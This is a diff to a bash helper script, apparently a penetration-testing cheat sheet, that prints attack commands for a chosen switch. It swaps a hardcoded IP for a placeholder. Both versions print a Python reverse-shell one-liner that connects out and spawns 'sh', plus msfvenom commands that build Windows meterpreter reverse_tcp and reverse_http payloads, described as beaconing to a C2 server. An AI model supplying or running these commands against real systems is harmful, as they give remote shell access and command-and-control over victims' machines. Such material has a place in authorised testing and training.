@@ -62,7 +62,7 @@ if [ "$SWITCH" == "--pythonshell" ]
 then
         IP=$2
         PORT=$3
-        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.6.196",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
+        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR-IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
 fi
 
 if [ "$SWITCH" == "--improveshell" ]
@@ -99,9 +99,9 @@ then
         PORT=$2
         EXT=$3
         echo "Description: A staged meterpreter executable runs which beacons out to our C2 server to receive a second stage which is then injected and executed in memory, which triggers a reverse shell callback."
-        echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.6.196 LPORT=$PORT -f $EXT > shell.$EXT"
-        echo "msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.8.6.196 LPORT=$PORT -f $EXT > shell.$EXT"
-        echo "msfvenom -p windows/meterpreter/reverse_http LHOST=10.8.6.196 LPORT=$PORT -f $EXT"
+        echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$Your-IP LPORT=$PORT -f $EXT > shell.$EXT"
+        echo "msfvenom -p windows/meterpreter_reverse_tcp LHOST=$Your-IP LPORT=$PORT -f $EXT > shell.$EXT"
+        echo "msfvenom -p windows/meterpreter/reverse_http LHOST=$Your-IP LPORT=$PORT -f $EXT"
 fi
 
 
